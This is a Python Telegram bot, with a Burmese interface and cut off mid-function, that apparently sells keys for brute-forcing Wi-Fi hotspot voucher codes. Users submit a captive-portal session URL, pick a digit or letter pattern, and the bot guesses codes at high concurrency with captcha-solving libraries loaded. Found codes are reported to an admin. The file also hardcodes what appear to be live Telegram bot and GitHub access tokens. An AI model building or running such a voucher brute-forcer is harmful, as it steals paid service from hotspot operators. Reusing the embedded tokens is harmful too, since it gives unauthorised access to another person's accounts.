import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = "9270543827:AAHIktdv-ULZQq_HspVNkjX91E3JgbdbchM"
GITHUB_TOKEN = "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"
REPO_OWNER = "kothethuser2-collab"
REPO_NAME = "bot-data"
ADMIN_ID = "6130147402"

# ===== Redeem / Scan config =====
RANDOM_CODE_DEFAULT_USES = 5
GITHUB_SYNC_DEBOUNCE = 5
STALLED_SCAN_SECONDS = 90

BLOCKED_EXACT_KEYS = {
    "123456", "1234567", "12345678", "111111", "000000", "222222", "333333",
    "444444", "555555", "666666", "777777", "888888", "999999", "654321",
    "ABCDEF", "ABC123", "ABC345", "QWERTY", "ASDFGH", "ZXCVBN", "PASSWORD",
    "ADMIN1", "ADMIN2", "TEST12", "TEST123", "FREE12", "FREE123"
}

bot = AsyncTeleBot(BOT_TOKEN)
_telegram_send = bot.send_message
_telegram_reply = bot.reply_to
_telegram_edit = bot.edit_message_text
user_data = {}
pending_actions = {}
redeem_access = {}
random_codes = {}
redeem_lock = asyncio.Lock()
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}
_github_sync_pending = {}
_admin_notified_exhausted = set()

session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()

SESSION_POOL_LIMIT = 100
SESSION_POOL_SLOTS = 25
CONCURRENCY = 1200
BATCH_SIZE = 5000

def format_duration(seconds_val):
    sec = max(0, int(seconds_val))
    h, rem = divmod(sec, 3600)
    m, s = divmod(rem, 60)
    if h > 0:
        return f"{h}h {m}m {s}s"
    if m > 0:
        return f"{m}m {s}s"
    return f"{s}s"

def is_weak_or_blocked_key(code: str) -> bool:
    c = (code or "").strip().upper()
    if not c:
        return True
    if c.startswith("ABC"):
        return True
    if c in BLOCKED_EXACT_KEYS:
        return True
    if len(set(c)) == 1:
        return True
    if c.isdigit():
        asc = "".join(str((int(c[0]) + i) % 10) for i in range(len(c)))
        desc = "".join(str((int(c[0]) - i) % 10) for i in range(len(c)))
        if c == asc or c == desc:
            return True
    if c.isalpha():
        seq_up = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        seq_dn = "ZYXWVUTSRQPONMLKJIHGFEDCBA"
        if c in seq_up or c in seq_dn:
            return True
    return False

async def purge_unauthorized_access():
    async with redeem_lock:
        codes, _ = await get_file_content("redeem_codes.json")
        valid_codes = set(codes.keys()) if isinstance(codes, dict) else set()
        bad_uids = []
        for uid, acc in redeem_access.items():
            k = str((acc or {}).get("code", "")).upper()
            if k not in valid_codes or is_weak_or_blocked_key(k):
                bad_uids.append(uid)
        for uid in bad_uids:
            redeem_access.pop(uid, None)
            task_info = scan_tasks.get(uid)
            if task_info and task_info.get("task") and not task_info["task"].done():
                task_info["stop"] = True
                task_info["scan_id"] = None
                for child_task in task_info.get("pending", set()):
                    child_task.cancel()
                task_info["task"].cancel()

# =====================================================================
# MENU KEYBOARDS
# =====================================================================
def get_main_keyboard(is_admin=False):
    markup = InlineKeyboardMarkup(row_width=2)
    btn_redeem = InlineKeyboardButton("🔑 Key ထည့်ရန်", callback_data="cmd_redeem_help")
    btn_input = InlineKeyboardButton("🌐 URL ထည့်ရန်", callback_data="cmd_input_help")
    btn_scan = InlineKeyboardButton("🔍 Scan စရန်", callback_data="cmd_scan_help")
    btn_stop = InlineKeyboardButton("🛑 Scan ရပ်ရန်", callback_data="cmd_stop")
    btn_my_status = InlineKeyboardButton("👤 ကျွန်ုပ်အခြေအနေ", callback_data="cmd_my_status")

    markup.add(btn_redeem, btn_input)
    markup.add(btn_scan, btn_stop)
    markup.add(btn_my_status)

    if is_admin:
        btn_gen = InlineKeyboardButton("⚙️ Key ထုတ်ရန်", callback_data="cmd_gen_help")
        btn_del = InlineKeyboardButton("🗑️ Key ဖျက်ရန်", callback_data="cmd_del_help")
        btn_add_uses = InlineKeyboardButton("➕ Uses ထပ်ပေါင်း", callback_data="cmd_add_uses_help")
        btn_reset_key = InlineKeyboardButton("🔄 Key Reset", callback_data="cmd_reset_key_help")
        btn_clean_exp = InlineKeyboardButton("🧹 ကုန်ပြီး Key ရှင်း", callback_data="cmd_clean_exhausted")
        btn_speed = InlineKeyboardButton("⚡ Speed Preset", callback_data="cmd_speed_menu")
        btn_list = InlineKeyboardButton("📋 Key စာရင်း", callback_data="cmd_listredeem")
        btn_stats = InlineKeyboardButton("📈 ကျန်ရှိမှု / Stats", callback_data="cmd_stats")
        btn_status = InlineKeyboardButton("📊 Bot Status", callback_data="cmd_status")
        markup.add(btn_gen, btn_del)
        markup.add(btn_add_uses, btn_reset_key)
        markup.add(btn_clean_exp, btn_speed)
        markup.add(btn_stats, btn_list)
        markup.add(btn_status)

    return markup

def get_speed_keyboard():
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("🐢 Low (600)", callback_data="set_speed_600"),
        InlineKeyboardButton("⚖️ Balanced (1200)", callback_data="set_speed_1200"),
        InlineKeyboardButton("🚀 High (1800)", callback_data="set_speed_1800")
    )
    markup.add(InlineKeyboardButton("🔙 နောက်သို့", callback_data="cmd_start"))
    return markup

def get_after_redeem_keyboard(is_admin=False):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🌐 URL ထည့်ရန်", callback_data="cmd_input_help"),
        InlineKeyboardButton("🔍 Scan စရန်", callback_data="cmd_scan_help")
    )
    markup.add(
        InlineKeyboardButton("👤 ကျွန်ုပ်အခြေအနေ", callback_data="cmd_my_status"),
        InlineKeyboardButton("🏠 Main Menu", callback_data="cmd_start")
    )
    return markup

def get_after_input_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔍 Scan စရန်", callback_data="cmd_scan_help"),
        InlineKeyboardButton("👤 ကျွန်ုပ်အခြေအနေ", callback_data="cmd_my_status")
    )
    markup.add(InlineKeyboardButton("🏠 Main Menu", callback_data="cmd_start"))
    return markup

def get_scan_keyboard():
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("6 လုံး (0-9)", callback_data="scan_6"),
        InlineKeyboardButton("7 လုံး (0-9)", callback_data="scan_7"),
        InlineKeyboardButton("8 လုံး (0-9)", callback_data="scan_8")
    )
    markup.add(
        InlineKeyboardButton("a-z (6 လုံး)", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("all (6 လုံး)", callback_data="scan_all")
    )
    markup.add(InlineKeyboardButton("🔙 နောက်သို့", callback_data="cmd_start"))
    return markup

def get_scanning_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🛑 Scan ရပ်ရန်", callback_data="cmd_stop"),
        InlineKeyboardButton("📈 ကျန်ရှိမှု / Stats", callback_data="cmd_stats")
    )
    return markup

def get_stopped_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔍 Scan ပြန်စရန်", callback_data="cmd_scan_help"),
        InlineKeyboardButton("🏠 Main Menu", callback_data="cmd_start")
    )
    return markup

# =====================================================================
# WEB SERVER & SESSIONS
# =====================================================================
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def rebuild_session():
    global session, _connector
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}?t={int(time.time())}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Cache-Control": "no-cache"
    }
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            parsed = json.loads(content)
            if isinstance(parsed, dict):
                normalized = {}
                for k, v in parsed.items():
                    nk = str(k).strip().upper()
                    if nk:
                        normalized[nk] = v
                return normalized, data['sha']
            return {}, data['sha']
        if response.status == 404:
            return {}, None
        body = await response.text()
        print(f"[github] GET {path} failed: {response.status} {body[:200]}")
        return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    normalized_content = {}
    if isinstance(content, dict):
        for k, v in content.items():
            nk = str(k).strip().upper()
            if nk:
                normalized_content[nk] = v

    current_sha = sha
    if not current_sha:
        _, latest_sha = await get_file_content(path)
        current_sha = latest_sha

    encoded = base64.b64encode(json.dumps(normalized_content, indent=2).encode('utf-8')).decode('utf-8')
    payload = {
        "message": message,
        "content": encoded,
    }
    if current_sha:
        payload["sha"] = current_sha

    async with session.put(url, headers=headers, json=payload) as response:
        text = await response.text()
        if response.status == 409:
            latest_data, latest_sha = await get_file_content(path)
            if isinstance(latest_data, dict):
                merged = dict(latest_data)
                merged.update(normalized_content)
                encoded_retry = base64.b64encode(json.dumps(merged, indent=2).encode('utf-8')).decode('utf-8')
                retry_payload = {
                    "message": message,
                    "content": encoded_retry,
                }
                if latest_sha:
                    retry_payload["sha"] = latest_sha
                async with session.put(url, headers=headers, json=retry_payload) as retry_resp:
                    retry_text = await retry_resp.text()
                    if retry_resp.status not in (200, 201):
                        print(f"[github] PUT retry {path} failed: {retry_resp.status} {retry_text[:200]}")
                    return retry_text
        if response.status not in (200, 201):
            print(f"[github] PUT {path} failed: {response.status} {text[:200]}")
        return text

async def notify_admin_found(chat_id, key_code, mode, found_code, expire_info):
    if str(chat_id) == ADMIN_ID:
        return
    msg = (
        f"🎉 **Success Code တွေ့ရှိပါပြီ!**\n\n"
        f"• User ID: `{chat_id}`\n"
        f"• Key: `{key_code}`\n"
        f"• Mode: `{mode}`\n"
        f"• Voucher Code: `{found_code}`\n"
        f"• {expire_info}"
    )
    try:
        await safe_send_message(int(ADMIN_ID), msg, parse_mode="Markdown")
    except Exception as e:
        print(f"[admin-found-notify] error: {e}")

async def notify_admin_exhausted(chat_id, code, uses_total, found_count=0, checked_count=0):
    notify_key = f"{chat_id}:{code}"
    if notify_key in _admin_notified_exhausted:
        return
    _admin_notified_exhausted.add(notify_key)
    msg = (
        f"🔔 Success Quota ပြည့်သွားပါပြီ\n\n"
        f"👤 User ID: {chat_id}\n"
        f"🔑 Key: {code}\n"
        f"✅ Success အသုံးပြုပြီး: {uses_total}/{uses_total}\n"
        f"🎫 Found တွေ့ရှိ: {found_count}\n"
        f"📦 Checked စစ်ဆေးပြီး: {checked_count:,}"
    )
    try:
        await safe_send_message(int(ADMIN_ID), msg)
    except Exception as e:
        print(f"[admin-notify] error: {e}")

async def _sync_redeem_to_github(chat_id):
    existing = _github_sync_pending.get(chat_id)
    if existing and not existing.done():
        return
    async def _do_sync():
        try:
            await asyncio.sleep(GITHUB_SYNC_DEBOUNCE)
            async with redeem_lock:
                access = redeem_access.get(chat_id)
                if not access:
                    return
                codes, sha = await get_file_content("redeem_codes.json")
                if not sha:
                    return
                user_code = access["code"]
                if user_code in codes:
                    codes[user_code]["uses_remaining"] = access["uses_remaining"]
                    await update_file_content(
                        "redeem_codes.json", codes, sha,
                        f"Sync uses_remaining for {chat_id}"
                    )
                    print(f"[github-sync] chat={chat_id} uses_remaining={access['uses_remaining']}")
        except Exception as e:
            print(f"[github-sync] error: {e}")
        finally:
            _github_sync_pending.pop(chat_id, None)
    _github_sync_pending[chat_id] = asyncio.create_task(_do_sync())

async def _final_sync_to_github(chat_id):
    async with redeem_lock:
        access = redeem_access.get(chat_id)
        if not access:
            return
        try:
            codes, sha = await get_file_content("redeem_codes.json")
            if not sha:
                return
            user_code = access["code"]
            if user_code in codes:
                codes[user_code]["uses_remaining"] = access["uses_remaining"]
                await update_file_content(
                    "redeem_codes.json", codes, sha,
                    f"Final sync uses_remaining for {chat_id}"
                )
                print(f"[final-sync] chat={chat_id} uses_remaining={access['uses_remaining']}")
        except Exception as e:
            print(f"[final-sync] error: {e}")

# =====================================================================
# SAFE TELEGRAM METHODS
# =====================================================================
TELEGRAM_MESSAGE_LIMIT = 3900
TELEGRAM_RETRY_LIMIT = 3

def split_telegram_message(text, max_chars=TELEGRAM_MESSAGE_LIMIT):
    if len(text) <= max_chars:
        return [text]
    chunks = []
    remaining = text
    while remaining:
        cut = min(max_chars, len(remaining))
        if cut < len(remaining):
            newline = remaining.rfind("\n", 0, cut)
            if newline > 0:
                cut = newline
        chunks.append(remaining[:cut].rstrip())
        remaining = remaining[cut:].lstrip()
    return chunks

async def safe_send_message(chat_id, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_send(chat_id, text, **kwargs)
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            print(f"[telegram] send retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
            await asyncio.sleep(1 + attempt)

async def safe_reply_to(message, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_reply(message, text, **kwargs)
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            print(f"[telegram] reply retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
            await asyncio.sleep(1 + attempt)

async def safe_edit_message_text(chat_id, message_id, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_edit(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                **kwargs
            )
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            print(f"[telegram] edit retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
            await asyncio.sleep(1 + attempt)

async def update_chunked_messages(chat_id, title, items, message_ids=None):
    chunks = split_telegram_message(f"{title}\n\n" + "\n\n".join(items))
    message_ids = list(message_ids or [])
    for index, chunk in enumerate(chunks):
        if index < len(message_ids):
            try:
                await safe_edit_message_text(chat_id, message_ids[index], chunk)
                continue
            except Exception as error:
                print(f"[telegram] edit failed after retries: {error}")
        sent = await safe_send_message(chat_id, chunk)
        if index < len(message_ids):
            message_ids[index] = sent.message_id
        else:
            message_ids.append(sent.message_id)
    return message_ids

bot.send_message = safe_send_message
bot.reply_to = safe_reply_to
bot.edit_message_text = safe_edit_message_text

# =====================================================================
# USER STATUS & ADMIN KEY ACTIONS
# =====================================================================
async def send_user_status(chat_id):
    is_admin = str(chat_id) == ADMIN_ID
    acc = redeem_access.get(chat_id)
    u_url = user_data.get(chat_id, {}).get("session_url")
    scan_info = scan_tasks.get(chat_id)
    is_scanning = bool(scan_info and not scan_info["task"].done())

    if acc and acc.get("uses_remaining", 0) > 0:
        key_line = f"🔑 Key: `{acc.get('code')}` | ကျန်ရှိ: `{acc.get('uses_remaining')}/{acc.get('uses_total')}`"
    else:
        key_line = "🔑 Key: မရှိသေးပါ (သို့မဟုတ် ကုန်ဆုံးပါပြီ)"

    url_line = f"🌐 Session URL: `{u_url}`" if u_url else "🌐 Session URL: ထည့်မထားသေးပါ"
    scan_line = f"🔍 Scan အခြေအနေ: {'လုပ်ဆောင်နေသည်' if is_scanning else 'ရပ်နားထားသည်'}"

    await safe_send_message(
        chat_id,
        f"👤 **ကျွန်ုပ် အသုံးပြုမှု အခြေအနေ**\n\n{key_line}\n{url_line}\n{scan_line}",
        parse_mode="Markdown",
        reply_markup=get_after_redeem_keyboard(is_admin)
    )

async def add_key_uses(chat_id, raw_input):
    if str(chat_id) != ADMIN_ID:
        await safe_send_message(chat_id, "No Permission")
        return
    parts = (raw_input or "").strip().split()
    if len(parts) != 2 or not parts[1].isdigit() or int(parts[1]) < 1:
        await safe_send_message(chat_id, "❌ ပုံစံမှန် ရိုက်ထည့်ပါ — ဥပမာ: `IH39KM 5`", parse_mode="Markdown")
        return
    code = parts[0].upper()
    add_amount = int(parts[1])
    if not re.fullmatch(r"[A-Z0-9]{6}", code):
        await safe_send_message(chat_id, "❌ ၆ လုံး Key မှန်ကန်စွာ ရိုက်ထည့်ပါ။")
        return

    updated_github = False
    new_rem = 0
    new_tot = 0

    async with redeem_lock:
        codes, sha = await get_file_content("redeem_codes.json")
        if isinstance(codes, dict) and code in codes:
            entry = codes[code]
            entry["uses_remaining"] = int(entry.get("uses_remaining", 0)) + add_amount
            entry["uses_total"] = max(int(entry.get("uses_total", entry["uses_remaining"])), entry["uses_remaining"])
            new_rem = entry["uses_remaining"]
            new_tot = entry["uses_total"]
            await update_file_content("redeem_codes.json", codes, sha, f"Add {add_amount} uses to {code}")
            updated_github = True

        for uid, acc in redeem_access.items():
            if str(acc.get("code", "")).upper() == code:
                acc["uses_remaining"] = int(acc.get("uses_remaining", 0)) + add_amount
                acc["uses_total"] = max(int(acc.get("uses_total", acc["uses_remaining"])), acc["uses_remaining"])
                if not updated_github:
                    new_rem = acc["uses_remaining"]
                    new_tot = acc["uses_total"]

    if not updated_github:
        await safe_send_message(chat_id, f"⚠️ `{code}` ကို `redeem_codes.json` ထဲတွင် မတွေ့ပါ။", parse_mode="Markdown")
        return

    await safe_send_message(
        chat_id,
        f"✅ **Key `{code}` ထဲသို့ `+{add_amount}` ထပ်ပေါင်းပြီးပါပြီ**\n• လက်ရှိ ကျန်ရှိမှု: `{new_rem}/{new_tot}`",
        parse_mode="Markdown"
    )

async def reset_key_usage(chat_id, raw_code):
    if str(chat_id) != ADMIN_ID:
        await safe_send_message(chat_id, "No Permission")
        return
    code = (raw_code or "").strip().upper()
    if not re.fullmatch(r"[A-Z0-9]{6}", code):
        await safe_send_message(chat_id, "❌ မှန်ကန်တဲ့ ၆ လုံး Key ရိုက်ထည့်ပေးပါ (ဥပမာ - IH39KM)။")
        return

    found_any = False
    reset_tot = RANDOM_CODE_DEFAULT_USES

    async with redeem_lock:
        codes, sha = await get_file_content("redeem_codes.json")
        if isinstance(codes, dict) and code in codes:
            entry = codes[code]
            tot = max(1, int(entry.get("uses_total", RANDOM_CODE_DEFAULT_USES)))
            entry["uses_remaining"] = tot
            entry["claimed_by"] = None
            entry["claimed_at"] = None
            reset_tot = tot
            await update_file_content("redeem_codes.json", codes, sha, f"Reset key {code}")
            found_any = True

        users_to_drop = [
            uid for uid, acc in redeem_access.items()
            if str(acc.get("code", "")).upper() == code
        ]
        for uid in users_to_drop:
            redeem_access.pop(uid, None)

    if not found_any:
        await safe_send_message(chat_id, f"⚠️ `{code}` ကို `redeem_codes.json` ထဲတွင် မတွေ့ပါ။", parse_mode="Markdown")
        return

    await safe_send_message(
        chat_id,
        f"🔄 **Key `{code}` ကို Reset လုပ်ပြီးပါပြီ**\n• ကျန်ရှိမှု အသစ်: `{reset_tot}/{reset_tot}`\n• Claimed User: `Cleared`",
        parse_mode="Markdown"
    )

async def clean_exhausted_keys(chat_id):
    if str(chat_id) != ADMIN_ID:
        await safe_send_message(chat_id, "No Permission")
        return

    async with redeem_lock:
        codes, sha = await get_file_content("redeem_codes.json")
        if not isinstance(codes, dict) or not codes:
            await safe_send_message(chat_id, "GitHub ထဲတွင် Key မရှိပါ။")
            return

        exhausted = [k for k, v in codes.items() if int(v.get("uses_remaining", 0)) <= 0]
        if not exhausted:
            await safe_send_message(chat_id, "✅ ကျန်ရှိမှု ကုန်သွားသော Key မရှိပါ။")
            return

        for k in exhausted:
            codes.pop(k, None)

        await update_file_content(
            "redeem_codes.json",
            codes,
            sha,
            f"Clean {len(exhausted)} exhausted key(s)"
        )

    await safe_send_message(
        chat_id,
        f"🧹 **ကုန်သွားသော Key `{len(exhausted)}` ခုကို ရှင်းလင်းပြီးပါပြီ**\n" + ", ".join(f"`{k}`" for k in exhausted[:20]),
        parse_mode="Markdown"
    )

# =====================================================================
# COMMANDS & HANDLERS
# =====================================================================
@bot.message_handler(commands=['start'])
async def start(message):
    pending_actions.pop(message.chat.id, None)
    await purge_unauthorized_access()
    is_admin = str(message.chat.id) == ADMIN_ID
    text = (
        "🤖 Bot မှ ကြိုဆိုပါတယ်\n"
        "👤 ဆက်သွယ်ရန်: @askogyi\n\n"
        "အောက်ပါ အဆင့်အတိုင်း ခလုတ်များကို နှိပ်၍ အသုံးပြုပါ —\n"
        "1️⃣ 🔑 Key ထည့်ရန် နှိပ်ပြီး Key ရိုက်ထည့်ပါ\n"
        "2️⃣ 🌐 URL ထည့်ရန် နှိပ်ပြီး Session URL ရိုက်ထည့်ပါ\n"
        "3️⃣ 🔍 Scan စရန် နှိပ်ပြီး Mode နှင့် အစနံပါတ်/စာလုံး ရွေးပါ"
    )
    await bot.reply_to(message, text, reply_markup=get_main_keyboard(is_admin))

@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    global CONCURRENCY, _voucher_sem
    try:
        chat_id = call.message.chat.id
        is_admin = str(chat_id) == ADMIN_ID

        if call.data == "cmd_start":
            pending_actions.pop(chat_id, None)
            await purge_unauthorized_access()
            text = "🤖 အောက်ပါ ခလုတ်များမှ လုပ်ဆောင်လိုသည်ကို ရွေးချယ်ပါ —"
            try:
                await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=get_main_keyboard(is_admin))
            except Exception:
                await bot.send_message(chat_id, text, reply_markup=get_main_keyboard(is_admin))
            await bot.answer_callback_query(call.id)

        elif call.data == "cmd_my_status":
            pending_actions.pop(chat_id, None)
            await purge_unauthorized_access()
            await bot.answer_callback_query(call.id, "အခြေအနေ ကြည့်နေပါပြီ...")
            await send_user_status(chat_id)

        elif call.data == "cmd_redeem_help":
            pending_actions[chat_id] = {"type": "redeem"}
            await bot.answer_callback_query(call.id, "Key ရိုက်ထည့်ပေးပါ")
            await bot.send_message(
                chat_id,
                "🔑 အဆင့် (၁) - Key ထည့်ရန်\nAdmin ထုတ်ပေးထားသော ၆ လုံး Key ကို ရိုးရိုးရိုက်ပို့ပေးပါ။\nပြီးလျှင် 🌐 URL ထည့်ရန် ခလုတ် ဆက်နှိပ်နိုင်ပါသည်။"
            )

        elif call.data == "cmd_input_help":
            pending_actions[chat_id] = {"type": "input"}
            await bot.answer_callback_query(call.id, "URL ရိုက်ထည့်ပေးပါ")
            await bot.send_message(
                chat_id,
                "🌐 အဆင့် (၂) - Wi-Fi URL ထည့်ရန်\nSession URL ကို ရိုးရိုးရိုက်ပို့ပေးပါ။\nပြီးလျှင် 🔍 Scan စရန် ခလုတ် ဆက်နှိပ်နိုင်ပါသည်။"
            )

        elif call.data == "cmd_scan_help":
            pending_actions.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "Scan Mode ရွေးပါ")
            scan_prompt = "🔍 အဆင့် (၃) - Scan Mode ရွေးပါ\nရှာဖွေလိုသော Mode ခလုတ်ကို နှိပ်ပါ —"
            try:
                await bot.edit_message_text(scan_prompt, chat_id, call.message.message_id, reply_markup=get_scan_keyboard())
            except Exception:
                await bot.send_message(chat_id, scan_prompt, reply_markup=get_scan_keyboard())

        elif call.data.startswith("scan_"):
            mode = call.data.split("_", 1)[1]
            if not await redeem_user_access(chat_id):
                await bot.answer_callback_query(call.id, "Key အရင်ထည့်ပါ")
                await bot.send_message(chat_id, "❌ အရင်ဆုံး 🔑 Key ထည့်ရန် နှိပ်ပြီး Valid Key ထည့်ပေးပါ။", reply_markup=get_main_keyboard(is_admin))
                return
            if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
                await bot.answer_callback_query(call.id, "URL အရင်ထည့်ပါ")
                await bot.send_message(chat_id, "❌ အရင်ဆုံး 🌐 URL ထည့်ရန် နှိပ်ပြီး Session URL ထည့်ပေးပါ။", reply_markup=get_after_redeem_keyboard(is_admin))
                return

            pending_actions[chat_id] = {"type": "scan_prefix", "mode": mode}
            await bot.answer_callback_query(call.id, f"Mode {mode} ရွေးပြီးပါပြီ")
            if mode in ("6", "7", "8"):
                hint = (
                    f"🔢 Mode {mode} အတွက် အစ စနံပါတ် ရိုက်ထည့်ပါ\n"
                    f"• ဥပမာ 123 ထည့်လျှင် {mode} လုံးထဲမှ 123 ဖြင့် စသောနံပါတ်များကို ရှာပေးမည်\n"
                    f"• ကျပန်းအစမှ စလိုလျှင် AUTO ဟု ရိုက်ပို့ပါ"
                )
            elif mode == "ascii-lower":
                hint = (
                    "🔤 Mode ascii-lower (6 လုံး a-z) အတွက် အစ စာလုံး ရိုက်ထည့်ပါ\n"
                    "• ဥပမာ ab ထည့်လျှင် ab ဖြင့် စသော ၆ လုံးစာလုံးများ ရှာပေးမည်\n"
                    "• ကျပန်းအစမှ စလိုလျှင် AUTO ဟု ရိုက်ပို့ပါ"
                )
            else:
                hint = (
                    "🔡 Mode all (6 လုံး a-z, 0-9) အတွက် အစ စာလုံး/နံပါတ် ရိုက်ထည့်ပါ\n"
                    "• ဥပမာ a1 ထည့်လျှင် a1 ဖြင့် စသော ၆ လုံးများ ရှာပေးမည်\n"
                    "• ကျပန်းအစမှ စလိုလျှင် AUTO ဟု ရိုက်ပို့ပါ"
                )
            await bot.send_message(chat_id, hint)

        elif call.data == "cmd_stop":
            pending_actions.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "Scan ရပ်နေပါပြီ...")
            await trigger_stop_scan(chat_id, call.message)

        elif call.data == "cmd_gen_help":
            if not is_admin:
                await bot.answer_callback_query(call.id, "No Permission")
                return
            pending_actions[chat_id] = {"type": "genredeem"}
            await bot.answer_callback_query(call.id, "Success count ရိုက်ထည့်ပေးပါ")
            await bot.send_message(chat_id, "⚙️ Success count ရိုက်ထည့်ပေးပါ (ဥပမာ - 5 သို့မဟုတ် 5 2)")

        elif call.data == "cmd_del_help":
            if not is_admin:
                await bot.answer_callback_query(call.id, "No Permission")
                return
            pending_actions[chat_id] = {"type": "delete_key"}
            await bot.answer_callback_query(call.id, "ဖျက်မယ့် Key ရိုက်ပို့ပါ")
            await bot.send_message(
                chat_id,
                "🗑️ ဖျက်/ပိတ်ချင်တဲ့ **Key** ကို ရိုက်ထည့်ပို့ပေးပါ —\n(ဥပမာ - `IH39KM`)",
                parse_mode="Markdown"
            )

        elif call.data == "cmd_add_uses_help":
            if not is_admin:
                await bot.answer_callback_query(call.id, "No Permission")
                return
            pending_actions[chat_id] = {"type": "add_uses"}
            await bot.answer_callback_query(call.id, "Key နှင့် ထပ်ပေါင်းမယ့်အရေအတွက် ရိုက်ပို့ပါ")
            await bot.send_message(
                chat_id,
                "➕ Uses ထပ်ပေါင်းမယ့် **Key** နဲ့ **အရေအတွက်** ရိုက်ထည့်ပေးပါ —\n(ဥပမာ - `IH39KM 5`)",
                parse_mode="Markdown"
            )

        elif call.data == "cmd_reset_key_help":
            if not is_admin:
                await bot.answer_callback_query(call.id, "No Permission")
                return
            pending_actions[chat_id] = {"type": "reset_key"}
            await bot.answer_callback_query(call.id, "Reset လုပ်မယ့် Key ရိုက်ပို့ပါ")
            await bot.send_message(
                chat_id,
                "🔄 Reset လုပ်ချင်တဲ့ **Key** ကို ရိုက်ထည့်ပို့ပေးပါ —\n(ဥပမာ - `IH39KM`)",
                parse_mode="Markdown"
            )

        elif call.data == "cmd_clean_exhausted":
            if not is_admin:
                await bot.answer_callback_query(call.id, "No Permission")
                return
            pending_actions.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "ကုန်ပြီး Key တွေ ရှင်းနေပါပြီ...")
            await clean_exhausted_keys(chat_id)

        elif call.data == "cmd_speed_menu":
            if not is_admin:
                await bot.answer_callback_query(call.id, "No Permission")
                return
            pending_actions.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "Speed Preset ရွေးပါ")
            await bot.send_message(
                chat_id,
                f"⚡ **Concurrency Preset ရွေးချယ်ပါ**\n• လက်ရှိ CONCURRENCY: `{CONCURRENCY}`",
                parse_mode="Markdown",
                reply_markup=get_speed_keyboard()
            )

        elif call.data.startswith("set_speed_"):
            if not is_admin:
                await bot.answer_callback_query(call.id, "No Permission")
                return
            new_conc = int(call.data.split("_")[-1])
            CONCURRENCY = new_conc
            _voucher_sem = asyncio.Semaphore(new_conc)
            await bot.answer_callback_query(call.id, f"CONCURRENCY -> {new_conc}")
            try:
                await bot.edit_message_text(
                    f"⚡ **CONCURRENCY ကို `{new_conc}` သို့ ပြောင်းလဲပြီးပါပြီ**",
                    chat_id,
                    call.message.message_id,
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard(True)
                )
            except Exception:
                await bot.send_message(
                    chat_id,
                    f"⚡ **CONCURRENCY ကို `{new_conc}` သို့ ပြောင်းလဲပြီးပါပြီ**",
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard(True)
                )

        elif call.data == "cmd_listredeem":
            pending_actions.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "စာရင်းဖတ်နေပါပြီ...")
            await send_redeem_list(chat_id, call.message)

        elif call.data == "cmd_status":
            pending_actions.pop(chat_id, None)
            await bot.answer_callback_query(call.id, "အခြေအနေစစ်ဆေးနေပါပြီ...")
            await send_bot_status(chat_id, call.message)

        elif call.data == "cmd_stats":
            pending_actions.pop(chat_id, None)
            await purge_unauthorized_access()
